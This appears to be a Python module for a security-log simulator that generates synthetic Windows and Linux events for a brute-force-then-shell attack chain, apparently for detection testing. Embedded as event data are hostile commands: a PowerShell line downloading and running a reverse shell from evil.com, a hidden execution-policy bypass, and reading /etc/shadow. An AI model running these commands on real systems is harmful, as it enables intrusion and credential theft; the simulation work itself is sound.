from loguru import logger

from shared.schemas.ecs.base import Process
from simulator.attack_scenarios.base import ScenarioBase, ScenarioMetadata
from simulator.config.entities import EntityManager, SimulationConfig

class BruteForceScenario(ScenarioBase):
    """
    Refined implementation of a deterministic T1110 (Brute Force) attack sequence.
    Sequence: 10 Failed Logons -> 1 Successful Logon -> Shell Spawn -> Tool Execution.
    """

    def __init__(
        self, 
        entity_manager: EntityManager, 
        config: SimulationConfig, 
        generators: dict
    ):
        metadata = ScenarioMetadata(
            name="Credential Brute Force and Initial Access",
            description="Simulates a multi-stage attack starting with a brute force attempt.",
            mitre_tactics=["Credential Access", "Execution", "Privilege Escalation"],
            mitre_techniques=["T1110.001", "T1059.001", "T1548.003"],
            supported_platforms=["windows", "linux"],
            version="1.0.1"
        )
        super().__init__(metadata, entity_manager, config, generators)

    def execute(self) -> None:
        """
        Orchestrates the brute force attack timeline using deterministic RNG.
        Dispatcher for platform-specific sequences.
        """
        if not self.victim_host.os_family:
            raise RuntimeError(f"Host {self.victim_host.hostname} has no os_family defined.")

        platform = self.victim_host.os_family.strip().lower()
        logger.info(f"Executing Brute Force scenario against {self.victim_host.hostname} ({platform})")

        if platform == "windows":
            self._execute_windows_sequence()
        elif platform == "linux":
            self._execute_linux_sequence()
        else:
            raise RuntimeError(f"Platform '{platform}' is not supported by this scenario.")

    def _execute_windows_sequence(self) -> None:
        win_gen = self.generators.get("windows")
        if win_gen is None:
            raise RuntimeError("Windows generator is not registered in the scenario.")
        
        # 1. 10 failed logon attempts (Event 4625)
        for i in range(10):
            self.advance_time(self._rng.uniform(0.5, 2.5))
            self.add_event(win_gen.generate_4625(self.victim_host, self.victim_user))
            logger.debug(f"Simulated failed Windows logon {i+1}/10")

        # 2. 1 successful logon (Event 4624)
        self.advance_time(self._rng.uniform(4.0, 7.0))
        self.add_event(win_gen.generate_4624(self.victim_host, self.victim_user))

        # 3. Spawn cmd.exe (Event 4688)
        self.advance_time(self._rng.uniform(8.0, 12.0))
        cmd_proc = Process(
            pid=self._rng.randint(1000, 9999),
            name="cmd.exe",
            executable="C:\\Windows\\System32\\cmd.exe",
            command_line="C:\\Windows\\System32\\cmd.exe /c whoami"
        )
        self.add_event(win_gen.generate_4688(self.victim_host, self.victim_user, cmd_proc))

        # 4. Spawn powershell.exe and Script Block (4688 + 4104)
        self.advance_time(self._rng.uniform(10.0, 15.0))
        ps_proc = Process(
            pid=self._rng.randint(1000, 9999),
            name="powershell.exe",
            executable="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden"
        )
        self.add_event(win_gen.generate_4688(self.victim_host, self.victim_user, ps_proc))
        self.add_event(win_gen.generate_4104(
            self.victim_host, 
            self.victim_user, 
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/reverseshell.ps1')"
        ))

    def _execute_linux_sequence(self) -> None:
        nix_gen = self.generators.get("linux")
        if nix_gen is None:
            raise RuntimeError("Linux generator is not registered in the scenario.")
        
        if not self.attacker.ip_pool:
            raise RuntimeError(f"Attacker {self.attacker.name} has an empty ip_pool.")
            
        attacker_ip = str(self.attacker.ip_pool[0])

        # 1. 10 failed SSH attempts
        for i in range(10):
            self.advance_time(self._rng.uniform(0.5, 2.0))
            self.add_event(nix_gen.generate_ssh_login(
                self.victim_host, self.victim_user, success=False, src_ip=attacker_ip
            ))
            logger.debug(f"Simulated failed Linux SSH attempt {i+1}/10")

        # 2. 1 successful SSH logon
        self.advance_time(self._rng.uniform(3.0, 6.0))
        self.add_event(nix_gen.generate_ssh_login(
            self.victim_host, self.victim_user, success=True, src_ip=attacker_ip
        ))

        # 3. Spawn bash (Auditd EXECVE)
        self.advance_time(self._rng.uniform(5.0, 10.0))
        self.add_event(nix_gen.generate_auditd_exec(self.victim_host, self.victim_user, "/bin/bash"))

        # 4. Sudo execution for privilege escalation check
        self.advance_time(self._rng.uniform(7.0, 12.0))
        self.add_event(nix_gen.generate_sudo(self.victim_host, self.victim_user, "/usr/bin/cat /etc/shadow"))